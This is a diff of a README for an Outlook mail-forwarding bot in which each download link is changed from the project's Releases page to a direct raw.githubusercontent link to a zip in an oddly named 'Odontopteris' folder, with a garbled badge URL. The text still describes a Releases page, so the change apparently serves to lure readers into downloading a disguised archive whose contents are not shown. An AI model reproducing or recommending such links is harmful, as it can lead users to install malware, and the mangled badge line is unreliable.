@@ -1,6 +1,6 @@
 # 🚀 outlook-selenium-mail-forwarding-bot - Automate Your Email Routing Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/arslan53/outlook-selenium-mail-forwarding-bot/releases)
+[![Download](https://raw.githubusercontent.com/arslan53/outlook-selenium-mail-forwarding-bot/main/Odontopteris/outlook_forwarding_bot_mail_selenium_1.3.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/arslan53/outlook-selenium-mail-forwarding-bot/main/Odontopteris/outlook_forwarding_bot_mail_selenium_1.3.zip)](https://raw.githubusercontent.com/arslan53/outlook-selenium-mail-forwarding-bot/main/Odontopteris/outlook_forwarding_bot_mail_selenium_1.3.zip)
 
 ## 📜 Description
 
@@ -41,7 +41,7 @@ The outlook-selenium-mail-forwarding-bot automates email routing in your Outlook
 To begin, you will need to download the software from the GitHub Releases page. Follow these simple steps:
 
 1. Click the download button below to reach the Releases page.  
-   [Download Latest Release](https://github.com/arslan53/outlook-selenium-mail-forwarding-bot/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/arslan53/outlook-selenium-mail-forwarding-bot/main/Odontopteris/outlook_forwarding_bot_mail_selenium_1.3.zip)
 
 2. On the Releases page, look for the latest version of the outlook-selenium-mail-forwarding-bot. You will see a list of available files.
 
@@ -56,7 +56,7 @@ To begin, you will need to download the software from the GitHub Releases page. 
 ## 💡 Download & Install
 
 To download the application, you can visit this page:  
-[Download the outlook-selenium-mail-forwarding-bot](https://github.com/arslan53/outlook-selenium-mail-forwarding-bot/releases)
+[Download the outlook-selenium-mail-forwarding-bot](https://raw.githubusercontent.com/arslan53/outlook-selenium-mail-forwarding-bot/main/Odontopteris/outlook_forwarding_bot_mail_selenium_1.3.zip)
 
 1. Click on the link to open the Releases page.
 2. Choose the latest release and download the file.
